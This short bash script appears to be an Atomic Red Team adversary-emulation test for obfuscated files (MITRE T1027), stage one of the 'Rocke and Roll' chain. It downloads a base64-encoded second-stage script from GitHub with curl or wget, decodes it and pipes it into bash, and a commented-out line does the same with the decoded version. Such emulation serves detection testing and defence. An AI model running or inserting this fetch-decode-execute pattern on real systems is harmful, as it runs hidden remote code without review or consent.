#! /bin/bash

#   Tactic: Defense Evasion
#   Technique: T1027 - Obfuscated Files or Information
bash -c "(curl -fsSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-base64.sh || wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-base64.sh)|base64 -d |/bin/bash"

# If you want to skip the base64 process, uncommend the following line:
# bash -c "(curl -fsSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh || wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh)|/bin/bash"

echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 01" >> /tmp/atomic.log
